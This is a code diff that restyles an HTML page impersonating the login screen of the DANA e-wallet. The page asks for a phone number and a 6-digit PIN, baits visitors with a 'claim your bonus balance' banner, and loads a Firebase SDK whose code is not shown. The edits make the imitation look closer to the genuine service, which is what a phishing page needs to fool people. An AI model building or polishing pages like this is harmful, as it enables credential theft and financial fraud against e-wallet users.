@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Masuk ke DANA</title>
+    <title>DANA - Masuk</title>
     
     <!-- Firebase SDK -->
     <script type="module">
@@ -50,113 +50,123 @@
             });
         });
     </script>
-    
+
     <style>
         body {
-            font-family: 'Arial', sans-serif;
-            background-color: #F0F8FF;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
         }
 
         .container {
             background-color: #fff;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            text-align: center;
+            padding: 30px 25px;
+            border-radius: 20px;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.08);
             width: 100%;
-            max-width: 350px;
+            max-width: 340px;
+            text-align: center;
         }
 
         .logo {
-            margin-bottom: 20px;
+            margin-bottom: 30px;
         }
 
         .logo img {
-            width: 100px;
-            cursor: pointer;
+            width: 120px;
+            height: auto;
         }
 
         h1 {
-            font-size: 18px;
-            color: #007AFF;
-            margin-bottom: 20px;
-            font-weight: bold;
+            color: #333;
+            font-size: 20px;
+            margin-bottom: 30px;
+            font-weight: 600;
         }
 
         .form-group {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
             text-align: left;
-        }
-
-        .form-group label {
-            font-size: 14px;
-            font-weight: bold;
-            color: #333;
-            display: block;
-            margin-bottom: 5px;
         }
 
         input {
             width: 100%;
-            padding: 12px;
+            padding: 14px;
             font-size: 16px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            background: #f8f8f8;
             box-sizing: border-box;
-            text-align: center;
+            transition: all 0.3s ease;
         }
 
         input:focus {
-            border-color: #007AFF;
+            border-color: #00AAFF;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(0, 170, 255, 0.1);
             outline: none;
-            box-shadow: 0 0 4px rgba(0, 123, 255, 0.3);
         }
 
         button {
             width: 100%;
-            background-color: #007AFF;
-            color: #fff;
-            padding: 12px;
+            background: linear-gradient(135deg, #00AAFF, #0088CC);
+            color: white;
+            padding: 15px;
             font-size: 16px;
+            font-weight: 600;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             cursor: pointer;
-            margin-top: 10px;
+            margin-top: 15px;
+            transition: all 0.2s ease;
         }
 
         button:hover {
-            background-color: #005BBB;
+            opacity: 0.95;
+            transform: translateY(-1px);
         }
 
-        .ubah-pin {
-            margin-top: 20px;
-            font-size: 14px;
+        .link-group {
+            margin: 20px 0;
+            display: flex;
+            justify-content: space-between;
         }
 
-        .ubah-pin a {
-            color: #007AFF;
+        .link-group a {
+            color: #00AAFF;
             text-decoration: none;
-            font-weight: bold;
-        }
-
-        .ubah-pin a:hover {
-            text-decoration: underline;
-        }
-
-        .bonus-text {
             font-size: 14px;
-            color: #007AFF;
-            background-color: #E6F2FF;
-            padding: 10px;
-            border-radius: 8px;
-            margin-top: 15px;
-            font-weight: bold;
+            font-weight: 500;
+        }
+
+        .promo-banner {
+            background-color: #F5FBFF;
+            border: 1px solid #00AAFF;
+            border-radius: 10px;
+            padding: 12px;
+            margin-top: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .promo-banner span {
+            color: #00AAFF;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .footer-text {
+            color: #666;
+            font-size: 12px;
+            margin-top: 25px;
+            line-height: 1.5;
         }
     </style>
 </head>
@@ -167,24 +177,45 @@
                 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSGglzp3pi04sdTe7teWwIj3abbA0HHqwYcxwzXVWi5ueYhk_MwQge3tE8&s=10" alt="DANA Logo">
             </a>
         </div>
-        <h1>Masuk ke DANA</h1>
+        <h1>Selamat datang kembali!</h1>
         <form id="loginForm">
             <div class="form-group">
-                <label for="phoneNumber">Nomor HP</label>
-                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="08XXXXXXXXXX" required pattern="[0-9]{10,13}">
+                <input type="tel" 
+                       id="phoneNumber" 
+                       name="phoneNumber" 
+                       placeholder="Nomor HP terdaftar"
+                       required
+                       pattern="[0-9]{10,13}">
             </div>
             <div class="form-group">
-                <label for="pin">PIN</label>
-                <input type="password" id="pin" name="pin" placeholder="******" required maxlength="6" inputmode="numeric">
+                <input type="password" 
+                       id="pin" 
+                       name="pin" 
+                       placeholder="Masukkan 6 digit PIN"
+                       required
+                       maxlength="6"
+                       inputmode="numeric">
             </div>
-            <button type="submit">Masuk</button>
+            <button type="submit">MASUK</button>
         </form>
-        <div class="ubah-pin">
-            <a href="#">Ubah PIN</a>
+        
+        <div class="link-group">
+            <a href="#">Lupa PIN?</a>
+            <a href="#">Daftar</a>
         </div>
-        <div class="bonus-text">
-            🎁 Klaim Bonus Saldo DANA Anda! 🎁
+
+        <div class="promo-banner">
+            <span>🎁 Klaim Bonus Saldo DANA Sekarang!</span>
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="#00AAFF">
+                <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+            </svg>
         </div>
+
+        <p class="footer-text">
+            Dengan masuk atau mendaftar, Anda menyetujui<br>
+            <a href="#" style="color: #00AAFF;">Syarat & Ketentuan</a> dan 
+            <a href="#" style="color: #00AAFF;">Kebijakan Privasi</a> DANA
+        </p>
     </div>
 </body>
 </html>
